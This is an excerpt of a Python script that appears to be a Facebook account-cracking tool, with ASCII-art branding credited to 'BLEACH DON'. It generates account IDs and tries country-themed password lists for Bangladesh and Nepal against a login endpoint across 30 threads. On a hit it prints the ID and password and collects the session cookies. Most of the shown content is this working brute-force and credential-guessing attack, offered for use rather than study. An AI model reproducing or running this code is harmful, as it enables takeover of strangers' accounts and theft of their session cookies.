...
sys.stdout.write('\x1b]2; =(💚)-BLEACH-HUU-(💚)=\x07')
...
def approval():
    ...
    if sexkey in ress:
        ...
        time.sleep(2)
        tks = sexkey
        os.system('xdg-open https://www.facebook.com/terobau.rijan?mibextid=ZbWKwL')
    
#__________________| LOGO |__________________#
logo=(f"""

.s5SSSs.  .s        .s5SSSs.  .s5SSSs.  .s5SSSs.  .s    s.  
      SS.                 SS.       SS.       SS.       SS. 
sS    S%S sS        sS    `:; sS    S%S sS    `:; sS    S%S 
SS    S%S SS        SS        SS    S%S SS        SS    S%S 
SS .sSSS  SS        SSSs.     SSSs. S%S SS        SSSs. S%S 
SS    S%S SS        SS        SS    S%S SS        SS    S%S 
SS    `:; SS        SS        SS    `:; SS        SS    `:; 
SS    ;,. SS    ;,. SS    ;,. SS    ;,. SS    ;,. SS    ;,. 
`:;;;;;:' `:;;;;;:' `:;;;;;:' :;    ;:' `:;;;;;:' :;    ;:' 
...
\x1b[1;97m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐\033[1;37m
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m AUTHOR \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mBLEACH DON\x1b[38;5;244m] \x1b[1;97m                   ┃
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m FACEBOOK \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mRI JAN(BLEACH)\x1b[38;5;244m] \x1b[1;97m             ┃
...
def bd():
        ...
        with tred(max_workers=30) as habib:    
            ...
            for psx in user:
                uid = code+psx
                passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire','free fire123','freefire@123']
                if mthd in ['1','01']:
...
def nepal():
        ...
        with tred(max_workers=30) as habib:    
            ...
            for psx in user:
                uid = code+psx
                passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123','Muji@1234','Ilovearmy123','Chettri123','Xettri123']
                if mthd in ['1','01']:
                    habib.submit(rndm1,uid,passlist)
                if mthd in ['2','02']:
                    habib.submit(rndm2,uid,passlist)
...
def rndm1(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
